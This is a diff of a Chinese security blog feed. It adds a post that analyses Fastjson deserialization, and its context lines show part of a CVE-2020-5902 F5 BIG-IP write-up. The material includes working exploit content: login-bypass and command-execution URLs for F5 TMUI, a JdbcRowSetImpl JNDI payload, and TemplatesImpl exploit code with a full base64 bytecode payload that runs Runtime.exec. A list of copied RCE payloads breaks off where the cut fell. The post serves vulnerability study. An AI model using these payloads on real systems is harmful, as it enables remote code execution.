@@ -237,7 +237,7 @@
 <p>3.命令执行<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp%2f123456</code></p>
 <p>4.还原list命令<br><code>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></p>
 <h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>在 <a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a> 中下载到所需文件的源码。</p>
-<h2 id="为什么要使用-tmui-login-jsp"><a href="#为什么要使用-tmui-login-jsp" class="headerlink" title="为什么要使用/tmui/login.jsp/..;/"></a>为什么要使用/tmui/login.jsp/..;/</h2><p>TMUI原本存在登录限制，使用/..;/是为了绕过登录限制。绕过登录限制是漏洞利用的基础，只有绕过了登录限制，才能无障碍进行后续步骤。</p>
+<h2 id="为什么要使用-tmui-login-jsp"><a href="#为什么要使用-tmui-login-jsp" class="headerlink" title="为什么要使用/tmui/login.jsp/..;/"></a>为什么要使用/tmui/login.jsp/..;/</h2><p>TMUI原本存在登录限制，使用<code>/..;/</code>是为了绕过登录限制。绕过登录限制是漏洞利用的基础，只有绕过了登录限制，才能无障碍进行后续步骤。</p>
 <p>登录限制之后的漏洞非常直接，通过代码审计可以很轻松的找到相应漏洞。</p>
 <h2 id="tmshCmd-jsp"><a href="#tmshCmd-jsp" class="headerlink" title="tmshCmd.jsp"></a>tmshCmd.jsp</h2><p>查看<code>tmshCmd_jsp.java</code>文件，在第110行调用<code>WorkspaceUtils.runTmshCommand</code>方法</p>
 <p><img src="/2020/07/06/CVE-2020-5902-F5-BigIP-TMUI/tmshCmd.png" alt="tmshCmd"></p>
@@ -261,6 +261,185 @@
 <p>经过本地测试<code>String []</code>不能使用<code>&amp;&amp;</code>拼接执行多条命令，而<code>String</code>（字符串）可以使用<code>&amp;&amp;</code>拼接多条命令，<code>Runtime.getRuntime().exec()</code>传入字符串和传入字符串数组的执行是有差异的。</p>
 <p>所以上述代码虽然将可控变量传入<code>Runtime.getRuntime().exec()</code>中，但无法造成任意命令执行。</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-5902</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Fastjson反序列化过程分析</title>
+    <url>/2020/02/27/Fastjson-deserialization/</url>
+    <content><![CDATA[<blockquote>
+<p>本篇文章记录fastjson反序列化的过程，记录自己对fastjson反序列化本质原因的学习过程，不对各版本的绕过做详细分析，版本绕过的分析网络上已经存在很多文章对其进行了清晰的描写。</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="fastjson反序列化过程的分析"><a href="#fastjson反序列化过程的分析" class="headerlink" title="fastjson反序列化过程的分析"></a>fastjson反序列化过程的分析</h1><p>先通过一个简单的Demo来认识fastjson的反序列化过程。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsondeserialization.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestUser</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name; <span class="comment">//私有属性，有getter、setter方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> flag; <span class="comment">//私有属性，有is、setter方法</span></span><br><span class="line">    <span class="keyword">public</span> String gender; <span class="comment">//公有属性，无getter、setter方法</span></span><br><span class="line">    <span class="keyword">private</span> String country; <span class="comment">//私有属性，无getter、setter方法</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User default Constructor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User isFlag"</span>);</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFlag</span><span class="params">(<span class="keyword">boolean</span> flag)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"call User setFlag"</span>);</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", flag="</span> + flag +</span><br><span class="line">                <span class="string">", gender='"</span> + gender + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", country='"</span> + country + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当json中存在<code>@type</code>时，fastjson会将json中<code>key:value</code>值映射到@type对应的类中。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsondeserialization.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonDeserializationDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr = <span class="string">"&#123;\"@type\":\"com.fastjsondeserialization.test.TestUser\",\"name\":\"seikei\",\"flag\": true,\"gender\":\"male\",\"country\":\"china\"&#125;"</span>;<span class="comment">//</span></span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span> + serializedStr);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------\n\n"</span>);</span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject]</span></span><br><span class="line">        System.out.println(<span class="string">"JSON.parse(serializedStr)："</span>);</span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span> + obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span> + obj1);</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        System.out.println(<span class="string">"JSON.parseObject(serializedStr)："</span>);</span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span> + obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span> + obj2);</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>以上代码的执行结果</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serializedStr&#x3D;&#123;&quot;@type&quot;:&quot;com.fastjsondeserialization.test.TestUser&quot;,&quot;name&quot;:&quot;seikei&quot;,&quot;flag&quot;: true,&quot;gender&quot;:&quot;male&quot;,&quot;country&quot;:&quot;china&quot;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSON.parse(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setFlag</span><br><span class="line">parse反序列化对象名称:com.fastjsondeserialization.test.TestUser</span><br><span class="line">parse反序列化：User&#123;name&#x3D;&#39;seikei&#39;, flag&#x3D;true, gender&#x3D;&#39;male&#39;, country&#x3D;&#39;null&#39;&#125;</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">JSON.parseObject(serializedStr)：</span><br><span class="line">call User default Constructor</span><br><span class="line">call User setName</span><br><span class="line">call User setFlag</span><br><span class="line">call User isFlag</span><br><span class="line">call User getName</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;gender&quot;:&quot;male&quot;,&quot;name&quot;:&quot;seikei&quot;&#125;</span><br><span class="line">-----------------------------------------------</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意<code>JSON.parse()</code>和<code>JSON.parseObject（）</code>的差别</p>
+<p><strong>JSON.parse()</strong></p>
+<p>在指定了<code>@type</code>的情况下，自动调用了TestUser类默认构造器，TestUser类对应的setter方法（setName）,最终结果是TestUser类的一个实例。注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害。</p>
+<p>还有一点需要注意的是<code>public gender</code>被成功赋值了，而<code>private country</code>没有成功赋值，fastjson在1.2.22, 1.1.54.android之后，增加了一个<code>SupportNonPublicField</code>特性，使得<code>private country</code>就算没有setter、getter方法也能成功赋值，该特性有在<code>TemplatesImpl</code>这条调用链中体现。</p>
+<p><strong>JSON.parseObject()</strong></p>
+<p>在指定了<code>@type</code>的情况下，自动调用了TestUser类默认构造器，TestUser类对应的setter方法（setName）以及对应的getter方法（getName）和is方法（isFlag），最终结果是一个字符串。这里多调用了getter和is方法，是因为<code>parseObject</code>在没有其他参数时，调用了<code>JSON.toJSON(obj)</code>，后续会通过gettter方法获取obj属性值。</p>
+<p><code>JSON.parseObject()</code>一直到<code>setName</code>方法的调用栈如下图，看到<code>JSON.parseObject()</code>会调用到<code>JSON.parse()</code>、再调用<code>DefaultJSONParser.parse()</code>，也就是说<code>JSON.parseObject()</code>本质上还是调用<code>JSON.parse()</code>进行反序列化的，区别是<code>parseObject()</code>会额外调用<code>JSON.toJSON()</code>来将Java对象转为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发反序列化。</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/fastjson-demo-stack.png" alt="fastjson-demo-stack"></p>
+<p>重点在知道json反序列化会调用setter和getter方法，指定<code>@type</code>时，fastjson会自动调用<code>@type</code>对应类的setter和getter方法，调用setter和getter方法是正常业务功能。但当该类的setter或getter方法可被利用时，会导致漏洞。这也是为什么fastjson在之前的修复一直都是添加类的黑名单，而不是禁止反序列化功能。</p>
+<p>fastjson具体的解析过程可以参考<a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
+<h1 id="fastjson利用链"><a href="#fastjson利用链" class="headerlink" title="fastjson利用链"></a>fastjson利用链</h1><p>我们知道Json中存在<code>@type</code>时，<code>JSON.parse()</code>会自动调用类的默认构造器和对应的setter方法，<code>JSON.parseObject()</code>会自动调用类的默认构造器和对应的setter、getter和is方法。</p>
+<p>利用的关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p>
+<ol>
+<li>该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行；</li>
+<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
+</ol>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p><code>JdbcRowSetImpl</code>的PoC为：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"xxx"</span>:&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Object"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>多加一个”xxx”是为了增加Payload的适用性。</p>
+<p><code>JdbcRowSetImpl.java</code>的代码查看方法，先<code>import com.sun.rowset.JdbcRowSetImpl;</code>，然后按住CMD（或CTRL）键点击即可查看。</p>
+<img src="/2020/02/27/Fastjson-deserialization/lookup-jdbcrowsetimpl.png" alt="lookup-jdbcrowsetimpl" style="zoom:39%;">
+
+
+
+<p><code>JdbcRowSetImpl</code>调用链的过程：</p>
+<ol>
+<li><code>JdbcRowSetImpl</code>对象恢复</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-restore.png" alt="jdbcrowsetimpl-restore"></p>
+<ol start="2">
+<li><code>setDataSourceName</code>方法调用</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-setdatasourcename.png" alt="jdbcrowsetimpl-setdatasourcename"></p>
+<ol start="3">
+<li><code>setAutocommit</code>方法调用，里面调用了<code>this.connect()</code></li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-setautocommit.png" alt="jdbcrowsetimpl-setautocommit"></p>
+<ol start="4">
+<li><code>this.connect()</code>调用<code>context.lookup(datasourceName)</code></li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-connect.png" alt="jdbcrowsetimpl-connect"></p>
+<p><code>javax/naming/InitialContext#lookup</code>进行ldap查询，在此可以进行JNDI注入。</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/InitialContext-lookup.png" alt="InitialContext-lookup"></p>
+<p>整个调用栈过程如下</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-stack.png" alt="jdbcrowsetimpl-stack"></p>
+<p>整个过程调用的都是setter方法，所以该调用链在<code>parse</code>和<code>parseObject()</code>中都能使用。</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，该调用链存在一定的限制，因为在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>。在实际场景中很少会设置<code>Feature.SupportNonPublicField</code>，所以该调用链在实际场景的利用有限。</p>
+<p>首先，在构造函数<code>TemplatesImplDemo</code>中的<code>Runtime.getRuntime().exec()</code>中输入想要执行的命令，然后将代码编译成class文件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImplDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TemplatesImplDemo</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImplDemo t = <span class="keyword">new</span> TemplatesImplDemo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将<code>evilClassPath</code>参数设置成上面编译得到的class文件。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonTemplatesImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">            <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">            <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/com/fastjsondeserialization/test/TemplatesImplDemo.class"</span>;</span><br><span class="line"></span><br><span class="line">            String evilCode = readClass(evilClassPath);</span><br><span class="line">            <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">            String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                    <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                    <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">            System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到fastjson的PoC：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADRMY29tL2Zhc3Rqc29uZGVzZXJpYWxpemF0aW9uL3Rlc3QvVGVtcGxhdGVzSW1wbERlbW87AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEAFlRlbXBsYXRlc0ltcGxEZW1vLmphdmEMAAgACQcALwwAMAAxAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAyY29tL2Zhc3Rqc29uZGVzZXJpYWxpemF0aW9uL3Rlc3QvVGVtcGxhdGVzSW1wbERlbW8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA&#x2F;AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFQAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAYAAgAGQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA&#x3D;&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将这串json字符放入fastjson解析，也就是<code>JSON.parse(&quot;{@type: &quot;...&quot;}&quot;, Feature.SupportNonPublicField)</code>就能触发漏洞。</p>
+<p>PoC中的关键点：</p>
+<ul>
+<li><p><code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</p>
+</li>
+<li><p><code>_bytecodes</code> 是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；</p>
+</li>
+<li><p>需要设置<code>_outputProperties</code>是因为漏洞利用链的关键会调用其参数的<code>getOutputProperties()</code>方法，进而导致命令执行；</p>
+</li>
+<li><p><code>_tfactory</code>设置为<code>{ }</code>，在<code>defineTransletClasses()</code>时会调用<code>getExternalExtensionsMap()</code>，当为null时会报错，所以要对<code>_tfactory</code>设置；</p>
+</li>
+</ul>
+<p><code>TemplatesImpl</code>调用链的过程：</p>
+<ol>
+<li><code>TemplatesImpl</code>对象恢复，赋值<code>_bytecodes</code>、<code>_name</code>、<code>_tfactory</code>等私有属性，然后会调用<code>getOutputProperties()</code>这个getter方法</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-getoutputproperties.png" alt="templatesimpl-getoutputproperties"></p>
+<ol start="2">
+<li><code>newTransformer()</code>方法调用，方法里调用了<code>getTransletInstance()</code></li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-newtransformer.png" alt="templatesimpl-newtransformer"></p>
+<ol start="3">
+<li><code>getTransletInstance()</code>方法调用，其中第451行<code>defineTransletClasses()</code>方法中会根据<code>_bytecodes</code>来生成一个java类，生成的java类随后会被<code>getTransletInstance()</code>方法用到生成一个实例。</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-gettransletinstance.png" alt="templatesimpl-gettransletinstance"></p>
+<ol start="4">
+<li>生成的Java类，会执行构造函数，也就是<code>Runtime.getRuntime().exec()</code>导致命令执行。</li>
+</ol>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-demo-runtime.png" alt="templatesimpl-demo-runtime"></p>
+<p>整个过程调用栈如下图</p>
+<p><img src="/2020/02/27/Fastjson-deserialization/templatesimpl-stack.png" alt="templatesimpl-stack"></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>fastjson中其他链可以参考<code>@type</code>黑名单，项目地址 <a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a> </p>
+<p>部分RCE payload记录，来自 <a href="https://paper.seebug.org/1192/" target="_blank" rel="noopener">https://paper.seebug.org/1192/</a> </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Object&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">    &quot;_bytecodes&quot;: [</span><br><span class="line">      